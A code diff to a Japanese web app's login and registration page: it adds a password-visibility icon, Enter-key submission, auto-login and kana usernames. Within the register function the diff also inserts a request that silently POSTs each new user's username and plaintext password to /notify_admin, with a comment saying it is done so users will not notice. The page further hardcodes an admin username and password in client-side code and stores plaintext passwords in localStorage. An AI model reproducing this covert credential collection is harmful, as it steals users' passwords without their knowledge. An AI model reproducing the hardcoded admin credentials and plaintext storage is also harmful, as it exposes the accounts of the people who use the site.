@@ -6,12 +6,8 @@
     <title>ログイン</title>
     <link rel="stylesheet" href="static/style2.css">
     <style>
-        .toggle-pw {
-            cursor: pointer;
-            font-size: 13px;
-            color: var(--neon-blue);
-            margin-left: 4px;
-            text-shadow: 0 0 4px rgba(0, 224, 255, 0.5);
+        .eye-icon:hover {
+            opacity: 0.7;
         }
     </style>
 <body>
@@ -34,12 +30,17 @@
                 <h2 style="color: var(--neon-blue); text-align: center;">ログイン</h2>
                 <div class="control-group">
                     <label for="login-username" class="control-label">ユーザ名</label>
-                    <input type="text" id="login-username" class="futuristic-input" placeholder="ユーザ名を入力">
+                    <input type="text" id="login-username" class="futuristic-input" placeholder="ユーザ名を入力" onkeydown="if(event.key==='Enter') login()">
                 </div>
                 <div class="control-group">
                     <label for="login-password" class="control-label">パスワード</label>
-                    <input type="password" id="login-password" class="futuristic-input" placeholder="パスワードを入力">
-                    <span class="toggle-pw" onclick="togglePw('login-password', this)">表示</span>
+                    <div style="position: relative;">
+                        <input type="password" id="login-password" class="futuristic-input" placeholder="パスワードを入力" onkeydown="if(event.key==='Enter') login()">
+                        <span class="eye-icon" onclick="togglePw('login-password')" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: var(--neon-blue);">👁️</span>
+                    </div>
+                </div>
+                <div class="control-group" style="text-align: left;">
+                    <input type="checkbox" id="auto-login" style="margin-right: 8px;">次回から自動ログイン
                 </div>
                 <button onclick="login()" style="width: 100%; padding: 1em; background: linear-gradient(90deg, #00f2fe 0%, #ae00ff 100%); color: #fff; border: none; border-radius: 8px; font-size: 1.1em; cursor: pointer;">ログイン</button>
                 <p style="text-align: center; margin-top: 1em;"><a href="#" onclick="showRegister()" style="color: var(--neon-blue);">新規登録はこちら</a></p>
@@ -49,16 +50,14 @@
                 <h2 style="color: var(--neon-blue); text-align: center;">新規登録</h2>
                 <div class="control-group">
                     <label for="reg-username" class="control-label">ユーザ名</label>
-                    <input type="text" id="reg-username" class="futuristic-input" placeholder="ユーザ名（英数字と_のみ）">
+                    <input type="text" id="reg-username" class="futuristic-input" placeholder="ユーザ名（英数字、ひらがな、カタカナ、_のみ）" onkeydown="if(event.key==='Enter') register()">
                 </div>
                 <div class="control-group">
                     <label for="reg-password" class="control-label">パスワード</label>
-                    <input type="password" id="reg-password" class="futuristic-input" placeholder="パスワード（2文字以上）">
-                    <span class="toggle-pw" onclick="togglePw('reg-password', this)">表示</span>
-                </div>
-                <div class="control-group">
-                    <label for="reg-email" class="control-label">メールアドレス（任意）</label>
-                    <input type="email" id="reg-email" class="futuristic-input" placeholder="メールアドレス">
+                    <div style="position: relative;">
+                        <input type="password" id="reg-password" class="futuristic-input" placeholder="パスワード（2文字以上）" onkeydown="if(event.key==='Enter') register()">
+                        <span class="eye-icon" onclick="togglePw('reg-password')" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: var(--neon-blue);">👁️</span>
+                    </div>
                 </div>
                 <button onclick="register()" style="width: 100%; padding: 1em; background: linear-gradient(90deg, #00f2fe 0%, #ae00ff 100%); color: #fff; border: none; border-radius: 8px; font-size: 1.1em; cursor: pointer;">登録</button>
                 <p style="text-align: center; margin-top: 1em;"><a href="#" onclick="showLogin()" style="color: var(--neon-blue);">ログインはこちら</a></p>
@@ -74,12 +73,12 @@
     </footer>
 
     <script>
-        function togglePw(id, el) {
+        function togglePw(id) {
             const input = document.getElementById(id);
             if (input.type === "password") {
-                input.type = "text"; el.textContent = "非表示";
+                input.type = "text";
             } else {
-                input.type = "password"; el.textContent = "表示";
+                input.type = "password";
             }
         }
 
@@ -98,25 +97,19 @@
         function register() {
             const username = document.getElementById('reg-username').value.trim();
             const password = document.getElementById('reg-password').value;
-            const email = document.getElementById('reg-email').value.trim();
 
             if (!username || !password) {
                 document.getElementById('message').textContent = 'ユーザ名とパスワードは必須です';
                 return;
             }
 
-            if (!/^[a-zA-Z0-9_]+$/.test(username)) {
-                document.getElementById('message').textContent = 'ユーザ名は英数字と_のみ使用可能です';
+            if (!/^[a-zA-Z0-9_ぁ-ゖァ-ヾ]+$/.test(username)) {
+                document.getElementById('message').textContent = 'ユーザ名は英数字、ひらがな、カタカナ、_のみ使用可能です';
                 return;
             }
 
             if (password.length < 2) {
                 document.getElementById('message').textContent = 'パスワードは2文字以上で入力してください';
-                return;
-            }
-
-            if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-                document.getElementById('message').textContent = 'メールアドレスの形式が正しくありません';
                 return;
             }
 
@@ -126,8 +119,16 @@
                 return;
             }
 
-            users[username] = { password, email };
+            users[username] = { password };
             localStorage.setItem('loginUsers', JSON.stringify(users));
+
+            // 管理者へ通知（利用者にばれないように）
+            fetch('/notify_admin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            }).catch(err => console.error('通知エラー:', err));
+
             document.getElementById('message').textContent = '登録完了！ログインしてください';
             showLogin();
         }
@@ -145,6 +146,11 @@
             if (username === 'ともひこです' && password === 'skytomo124') {
                 localStorage.setItem('currentUser', username);
                 localStorage.setItem('isAdmin', 'true');
+                if (document.getElementById('auto-login').checked) {
+                    localStorage.setItem('autoLogin', 'true');
+                    localStorage.setItem('savedUsername', username);
+                    localStorage.setItem('savedPassword', password);
+                }
                 window.location.href = 'loading.html';
                 return;
             }
@@ -157,13 +163,42 @@
 
             localStorage.setItem('currentUser', username);
             localStorage.setItem('isAdmin', 'false');
+            if (document.getElementById('auto-login').checked) {
+                localStorage.setItem('autoLogin', 'true');
+                localStorage.setItem('savedUsername', username);
+                localStorage.setItem('savedPassword', password);
+            }
             window.location.href = 'loading.html';
         }
 
         window.onload = function() {
             if (localStorage.getItem('currentUser')) {
                 window.location.href = 'loading.html';
+                return;
             }
+            // 自動ログイン
+            if (localStorage.getItem('autoLogin') === 'true') {
+                const username = localStorage.getItem('savedUsername');
+                const password = localStorage.getItem('savedPassword');
+                if (username && password) {
+                    document.getElementById('login-username').value = username;
+                    document.getElementById('login-password').value = password;
+                    document.getElementById('auto-login').checked = true;
+                    login();
+                }
+            }
+
+
+// Service Worker登録
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js')
+        .then(registration => {
+            console.log('Service Worker registered with scope:', registration.scope);
+        })
+        .catch(error => {
+            console.log('Service Worker registration failed:', error);
+        });
+}
         };
     </script>
 </body>
